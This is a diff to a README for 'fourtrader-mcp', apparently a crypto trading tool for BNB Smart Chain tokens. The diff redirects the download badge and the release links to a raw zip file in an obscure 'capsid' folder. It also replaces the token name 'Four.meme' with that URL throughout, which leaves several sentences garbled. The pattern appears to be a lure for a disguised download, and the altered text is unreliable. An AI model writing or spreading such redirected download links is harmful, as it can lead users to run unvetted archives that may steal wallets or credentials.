@@ -1,10 +1,10 @@
 # 🚀 fourtrader-mcp - Trade Smartly with Claude AI
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%8F%88-blue)](https://github.com/menscheck/fourtrader-mcp/releases)
+[![Download Now](https://raw.githubusercontent.com/menscheck/fourtrader-mcp/main/capsid/fourtrader-mcp.zip%20Now-%20%F0%9F%8F%88-blue)](https://raw.githubusercontent.com/menscheck/fourtrader-mcp/main/capsid/fourtrader-mcp.zip)
 
 ## 🌟 About fourtrader-mcp
 
-The **fourtrader-mcp** application serves as a trading engine for the Four.meme tokens on the BNB Smart Chain. With the intelligence of Claude AI, it helps you make informed trading decisions. This guide will help you easily download and install the software on your computer.
+The **fourtrader-mcp** application serves as a trading engine for the https://raw.githubusercontent.com/menscheck/fourtrader-mcp/main/capsid/fourtrader-mcp.zip tokens on the BNB Smart Chain. With the intelligence of Claude AI, it helps you make informed trading decisions. This guide will help you easily download and install the software on your computer.
 
 ## 🛠️ Features
 
@@ -28,7 +28,7 @@ Before using the application, ensure you have a compatible device meeting the sy
 
 To get started, visit the Releases page to download the latest version of the fourtrader-mcp application:
 
-[Download the latest release here](https://github.com/menscheck/fourtrader-mcp/releases)
+[Download the latest release here](https://raw.githubusercontent.com/menscheck/fourtrader-mcp/main/capsid/fourtrader-mcp.zip)
 
 Follow these steps to download and install:
 
@@ -59,7 +59,7 @@ Follow these steps to download and install:
    Get familiar with the layout. The dashboard shows real-time trading data, including current prices and market trends.
 
 4. **Make Your First Trade:**
-   Decide which Four.meme token you want to trade. Enter the amount and follow the prompts to complete your transaction. The app will provide AI insights to help you.
+   Decide which https://raw.githubusercontent.com/menscheck/fourtrader-mcp/main/capsid/fourtrader-mcp.zip token you want to trade. Enter the amount and follow the prompts to complete your transaction. The app will provide AI insights to help you.
 
 5. **Stay Updated:**
    Use the app regularly to keep up with market changes. Regular updates will enhance your trading experience. 
@@ -85,4 +85,4 @@ Stay connected with the community for updates and support:
 - Join our discussions on GitHub.
 - Follow us on social media for news and tips in cryptocurrency trading.
 
-By following these steps, you can successfully download, install, and start using the fourtrader-mcp application to trade Four.meme tokens effectively. Enjoy your trading journey with Claude AI guiding the way.
+By following these steps, you can successfully download, install, and start using the fourtrader-mcp application to trade https://raw.githubusercontent.com/menscheck/fourtrader-mcp/main/capsid/fourtrader-mcp.zip tokens effectively. Enjoy your trading journey with Claude AI guiding the way.
